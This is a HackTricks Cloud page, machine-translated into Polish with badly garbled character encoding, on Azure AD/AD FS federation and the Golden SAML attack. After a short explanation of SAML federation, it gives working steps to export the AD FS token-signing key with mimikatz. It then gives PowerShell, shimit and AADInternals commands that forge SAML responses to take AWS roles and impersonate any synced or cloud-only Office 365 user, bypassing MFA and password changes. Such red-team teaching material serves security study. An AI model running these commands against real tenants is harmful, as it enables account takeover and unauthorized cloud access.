# Az - Federation

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="../../../../.gitbook/assets/image (1).png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../../../.gitbook/assets/image (1).png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="../../../../.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../../../.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** ğŸ’¬ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

## Basic Information

[From the docs:](https://learn.microsoft.com/en-us/entra/identity/hybrid/connect/whatis-fed)**Federacja** to zbiÃ³r **domen**, ktÃ³re nawiÄ…zaÅ‚y **zaufanie**. Poziom zaufania moÅ¼e siÄ™ rÃ³Å¼niÄ‡, ale zazwyczaj obejmuje **uwierzytelnianie** i prawie zawsze obejmuje **autoryzacjÄ™**. Typowa federacja moÅ¼e obejmowaÄ‡ **liczne organizacje**, ktÃ³re nawiÄ…zaÅ‚y **zaufanie** do **wspÃ³lnego dostÄ™pu** do zestawu zasobÃ³w.

MoÅ¼esz **federowaÄ‡ swoje lokalne** Å›rodowisko **z Azure AD** i uÅ¼ywaÄ‡ tej federacji do uwierzytelniania i autoryzacji. Ta metoda logowania zapewnia, Å¼e wszystkie **uwierzytelnienia uÅ¼ytkownikÃ³w odbywajÄ… siÄ™ lokalnie**. Ta metoda pozwala administratorom na wdroÅ¼enie bardziej rygorystycznych poziomÃ³w kontroli dostÄ™pu. Federacja z **AD FS** i PingFederate jest dostÄ™pna.

<figure><img src="../../../../.gitbook/assets/image (154).png" alt=""><figcaption></figcaption></figure>

W zasadzie, w Federacji, wszystkie **uwierzytelnienia** odbywajÄ… siÄ™ w **lokalnym** Å›rodowisku, a uÅ¼ytkownik doÅ›wiadcza SSO we wszystkich zaufanych Å›rodowiskach. Dlatego uÅ¼ytkownicy mogÄ… **uzyskiwaÄ‡ dostÄ™p** do **aplikacji w chmurze** uÅ¼ywajÄ…c swoich **lokalnych poÅ›wiadczeÅ„**.

**Security Assertion Markup Language (SAML)** jest uÅ¼ywany do **wymiany** wszystkich informacji o uwierzytelnianiu i autoryzacji miÄ™dzy dostawcami.

W kaÅ¼dej konfiguracji federacyjnej sÄ… trzy strony:

* UÅ¼ytkownik lub Klient
* Dostawca ToÅ¼samoÅ›ci (IdP)
* Dostawca UsÅ‚ug (SP)

(Images from https://www.cyberark.com/resources/threat-research-blog/golden-saml-newly-discovered-attack-technique-forges-authentication-to-cloud-apps)

<figure><img src="../../../../.gitbook/assets/image (121).png" alt=""><figcaption></figcaption></figure>

1. PoczÄ…tkowo aplikacja (Dostawca UsÅ‚ug lub SP, taka jak konsola AWS lub klient webowy vSphere) jest dostÄ™pna dla uÅ¼ytkownika. Ten krok moÅ¼e byÄ‡ pominiÄ™ty, prowadzÄ…c klienta bezpoÅ›rednio do IdP (Dostawca ToÅ¼samoÅ›ci) w zaleÅ¼noÅ›ci od konkretnej implementacji.
2. NastÄ™pnie SP identyfikuje odpowiedni IdP (np. AD FS, Okta) do uwierzytelniania uÅ¼ytkownika. NastÄ™pnie tworzy Å¼Ä…danie AuthnRequest SAML (Security Assertion Markup Language) i przekierowuje klienta do wybranego IdP.
3. IdP przejmuje, uwierzytelniajÄ…c uÅ¼ytkownika. Po uwierzytelnieniu, IdP formuÅ‚uje SAMLResponse i przesyÅ‚a go do SP przez uÅ¼ytkownika.
4. Na koniec SP ocenia SAMLResponse. JeÅ›li zostanie pomyÅ›lnie zweryfikowany, co oznacza zaufanie do IdP, uÅ¼ytkownik uzyskuje dostÄ™p. To oznacza zakoÅ„czenie procesu logowania, pozwalajÄ…c uÅ¼ytkownikowi na korzystanie z usÅ‚ugi.

**If you want to learn more about SAML authentication and common attacks go to:**

{% embed url="https://book.hacktricks.xyz/pentesting-web/saml-attacks" %}

## Pivoting

* AD FS to model toÅ¼samoÅ›ci oparty na roszczeniach.
* "..roszczenia to po prostu stwierdzenia (na przykÅ‚ad, imiÄ™, toÅ¼samoÅ›Ä‡, grupa), dotyczÄ…ce uÅ¼ytkownikÃ³w, ktÃ³re sÄ… uÅ¼ywane gÅ‚Ã³wnie do autoryzacji dostÄ™pu do aplikacji opartych na roszczeniach znajdujÄ…cych siÄ™ wszÄ™dzie w Internecie."
* Roszczenia dla uÅ¼ytkownika sÄ… zapisane w tokenach SAML i sÄ… nastÄ™pnie podpisywane, aby zapewniÄ‡ poufnoÅ›Ä‡ przez IdP.
* UÅ¼ytkownik jest identyfikowany przez ImmutableID. Jest on globalnie unikalny i przechowywany w Azure AD.
* ImmutableID jest przechowywany lokalnie jako ms-DS-ConsistencyGuid dla uÅ¼ytkownika i/lub moÅ¼e byÄ‡ wyprowadzony z GUID uÅ¼ytkownika.
* WiÄ™cej informacji w [https://learn.microsoft.com/en-us/windows-server/identity/ad-fs/technical-reference/the-role-of-claims](https://learn.microsoft.com/en-us/windows-server/identity/ad-fs/technical-reference/the-role-of-claims)

**Atak Golden SAML:**

* W ADFS, SAML Response jest podpisywany przez certyfikat podpisywania tokenÃ³w.
* JeÅ›li certyfikat zostanie skompromitowany, moÅ¼liwe jest uwierzytelnienie do Azure AD jako DOWOLNY uÅ¼ytkownik zsynchronizowany z Azure AD!
* Tak jak w przypadku naduÅ¼ycia PTA, zmiana hasÅ‚a dla uÅ¼ytkownika lub MFA nie bÄ™dzie miaÅ‚a Å¼adnego wpÅ‚ywu, poniewaÅ¼ faÅ‚szujemy odpowiedÅº uwierzytelniajÄ…cÄ….
* Certyfikat moÅ¼na wyodrÄ™bniÄ‡ z serwera AD FS z uprawnieniami DA, a nastÄ™pnie moÅ¼na go uÅ¼ywaÄ‡ z dowolnej maszyny podÅ‚Ä…czonej do internetu.
* WiÄ™cej informacji w [https://www.cyberark.com/resources/threat-research-blog/golden-saml-newly-discovered-attack-technique-forges-authentication-to-cloud-apps](https://www.cyberark.com/resources/threat-research-blog/golden-saml-newly-discovered-attack-technique-forges-authentication-to-cloud-apps)

### Golden SAML

Proces, w ktÃ³rym **Dostawca ToÅ¼samoÅ›ci (IdP)** produkuje **SAMLResponse** w celu autoryzacji logowania uÅ¼ytkownika, jest kluczowy. W zaleÅ¼noÅ›ci od konkretnej implementacji IdP, **odpowiedÅº** moÅ¼e byÄ‡ **podpisana** lub **szyfrowana** przy uÅ¼yciu **prywatnego klucza IdP**. Procedura ta umoÅ¼liwia **Dostawcy UsÅ‚ug (SP)** potwierdzenie autentycznoÅ›ci SAMLResponse, zapewniajÄ…c, Å¼e rzeczywiÅ›cie zostaÅ‚a wydana przez zaufany IdP.

MoÅ¼na to porÃ³wnaÄ‡ do [ataku na zÅ‚oty bilet](https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/golden-ticket), gdzie klucz uwierzytelniajÄ…cy toÅ¼samoÅ›Ä‡ i uprawnienia uÅ¼ytkownika (KRBTGT dla zÅ‚otych biletÃ³w, prywatny klucz podpisywania tokenÃ³w dla zÅ‚otego SAML) moÅ¼e byÄ‡ manipulowany w celu **faÅ‚szowania obiektu uwierzytelniajÄ…cego** (TGT lub SAMLResponse). To pozwala na podszywanie siÄ™ pod dowolnego uÅ¼ytkownika, przyznajÄ…c nieautoryzowany dostÄ™p do SP.

ZÅ‚ote SAML oferujÄ… pewne zalety:

* MogÄ… byÄ‡ **tworzone zdalnie**, bez potrzeby bycia czÄ™Å›ciÄ… domeny lub federacji.
* PozostajÄ… skuteczne nawet przy wÅ‚Ä…czonym **uwierzytelnianiu dwuskÅ‚adnikowym (2FA)**.
* Prywatny klucz podpisywania **tokenÃ³w nie odnawia siÄ™ automatycznie**.
* **Zmiana hasÅ‚a uÅ¼ytkownika nie uniewaÅ¼nia** juÅ¼ wygenerowanego SAML.

#### AWS + AD FS + Golden SAML

[UsÅ‚ugi Federacji Active Directory (AD FS)](https://docs.microsoft.com/en-us/previous-versions/windows/server-2008/bb897402\(v=msdn.10\)) to usÅ‚uga Microsoftu, ktÃ³ra uÅ‚atwia **bezpiecznÄ… wymianÄ™ informacji o toÅ¼samoÅ›ci** miÄ™dzy zaufanymi partnerami biznesowymi (federacja). W zasadzie pozwala to usÅ‚udze domeny na dzielenie siÄ™ toÅ¼samoÅ›ciami uÅ¼ytkownikÃ³w z innymi dostawcami usÅ‚ug w ramach federacji.

Z AWS ufajÄ…cym skompromitowanej domenie (w federacji), ta luka moÅ¼e byÄ‡ wykorzystana do potencjalnego **zdobycia dowolnych uprawnieÅ„ w Å›rodowisku AWS**. Atak wymaga **prywatnego klucza uÅ¼ywanego do podpisywania obiektÃ³w SAML**, podobnie jak w przypadku potrzeby KRBTGT w ataku na zÅ‚oty bilet. DostÄ™p do konta uÅ¼ytkownika AD FS jest wystarczajÄ…cy, aby uzyskaÄ‡ ten prywatny klucz.

Wymagania do przeprowadzenia ataku Golden SAML obejmujÄ…:

* **Prywatny klucz podpisywania tokenÃ³w**
* **Publiczny certyfikat IdP**
* **Nazwa IdP**
* **Nazwa roli (rola do przyjÄ™cia)**
* DomenÄ™\username
* NazwÄ™ sesji roli w AWS
* Identyfikator konta Amazon

_Tylko elementy pogrubione sÄ… obowiÄ…zkowe. PozostaÅ‚e moÅ¼na wypeÅ‚niÄ‡ wedÅ‚ug uznania._

Aby uzyskaÄ‡ **prywatny klucz**, konieczny jest dostÄ™p do **konta uÅ¼ytkownika AD FS**. StamtÄ…d prywatny klucz moÅ¼na **wyeksportowaÄ‡ z osobistego magazynu** za pomocÄ… narzÄ™dzi takich jak [mimikatz](https://github.com/gentilkiwi/mimikatz). Aby zebraÄ‡ inne wymagane informacje, moÅ¼na wykorzystaÄ‡ snapin Microsoft.Adfs.Powershell w nastÄ™pujÄ…cy sposÃ³b, upewniajÄ…c siÄ™, Å¼e jesteÅ› zalogowany jako uÅ¼ytkownik ADFS:
```powershell
# From an "AD FS" session
# After having exported the key with mimikatz

# ADFS Public Certificate
[System.Convert]::ToBase64String($cer.rawdata)

# IdP Name
(Get-ADFSProperties).Identifier.AbsoluteUri

# Role Name
(Get-ADFSRelyingPartyTrust).IssuanceTransformRule
```
Z wszystkimi informacjami moÅ¼liwe jest zapomnienie o waÅ¼nym SAMLResponse jako uÅ¼ytkownik, ktÃ³rego chcesz udawaÄ‡, uÅ¼ywajÄ…c [**shimit**](https://github.com/cyberark/shimit)**:**

{% code overflow="wrap" %}
```bash
# Apply session for AWS cli
python .\shimit.py -idp http://adfs.lab.local/adfs/services/trust -pk key_file -c cert_file -u domain\admin -n admin@domain.com -r ADFS-admin -r ADFS-monitor -id 123456789012
# idp - Identity Provider URL e.g. http://server.domain.com/adfs/services/trust
# pk - Private key file full path (pem format)
# c - Certificate file full path (pem format)
# u - User and domain name e.g. domain\username (use \ or quotes in *nix)
# n - Session name in AWS
# r - Desired roles in AWS. Supports Multiple roles, the first one specified will be assumed.
# id - AWS account id e.g. 123456789012

# Save SAMLResponse to file
python .\shimit.py -idp http://adfs.lab.local/adfs/services/trust -pk key_file -c cert_file -u domain\admin -n admin@domain.com -r ADFS-admin -r ADFS-monitor -id 123456789012 -o saml_response.xml
```
{% endcode %}

<figure><img src="../../../../.gitbook/assets/image (128).png" alt=""><figcaption></figcaption></figure>

### On-prem -> chmura
```powershell
# With a domain user you can get the ImmutableID of the target user
[System.Convert]::ToBase64String((Get-ADUser -Identity <username> | select -ExpandProperty ObjectGUID).tobytearray())

# On AD FS server execute as administrator
Get-AdfsProperties | select identifier

# When setting up the AD FS using Azure AD Connect, there is a difference between IssueURI on ADFS server and Azure AD.
# You need to use the one from AzureAD.
# Therefore, check the IssuerURI from Azure AD too (Use MSOL module and need GA privs)
Get-MsolDomainFederationSettings -DomainName deffin.com | select IssuerUri

# Extract the ADFS token signing certificate from the ADFS server using AADInternals
Export-AADIntADFSSigningCertificate

# Impersonate a user to to access cloud apps
Open-AADIntOffice365Portal -ImmutableID v1pOC7Pz8kaT6JWtThJKRQ== -Issuer http://deffin.com/adfs/services/trust -PfxFileName C:\users\adfsadmin\Documents\ADFSSigningCertificate.pfx -Verbose
```
MoÅ¼liwe jest rÃ³wnieÅ¼ utworzenie ImmutableID uÅ¼ytkownikÃ³w tylko w chmurze i ich podszywanie siÄ™.
```powershell
# Create a realistic ImmutableID and set it for a cloud only user
[System.Convert]::ToBase64String((New-Guid).tobytearray())
Set-AADIntAzureADObject -CloudAnchor "User_19e466c5-d938-1293-5967-c39488bca87e" -SourceAnchor "aodilmsic30fugCUgHxsnK=="

# Extract the ADFS token signing certificate from the ADFS server using AADInternals
Export-AADIntADFSSigningCertificate

# Impersonate the user
Open-AADIntOffice365Portal -ImmutableID "aodilmsic30fugCUgHxsnK==" -Issuer http://deffin.com/adfs/services/trust -PfxFileName C:\users\adfsadmin\Desktop\ADFSSigningCertificate.pfx -Verbose
```
## References

* [https://learn.microsoft.com/en-us/azure/active-directory/hybrid/whatis-fed](https://learn.microsoft.com/en-us/azure/active-directory/hybrid/whatis-fed)
* [https://www.cyberark.com/resources/threat-research-blog/golden-saml-newly-discovered-attack-technique-forges-authentication-to-cloud-apps](https://www.cyberark.com/resources/threat-research-blog/golden-saml-newly-discovered-attack-technique-forges-authentication-to-cloud-apps)

{% hint style="success" %}
Ucz siÄ™ i Ä‡wicz Hacking AWS:<img src="../../../../.gitbook/assets/image (1).png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../../../.gitbook/assets/image (1).png" alt="" data-size="line">\
Ucz siÄ™ i Ä‡wicz Hacking GCP: <img src="../../../../.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../../../.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Wsparcie HackTricks</summary>

* SprawdÅº [**plany subskrypcyjne**](https://github.com/sponsors/carlospolop)!
* **DoÅ‚Ä…cz do** ğŸ’¬ [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegram**](https://t.me/peass) lub **Å›ledÅº** nas na **Twitterze** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Dziel siÄ™ trikami hackingowymi, przesyÅ‚ajÄ…c PR-y do** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repozytoriÃ³w github.

</details>
{% endhint %}
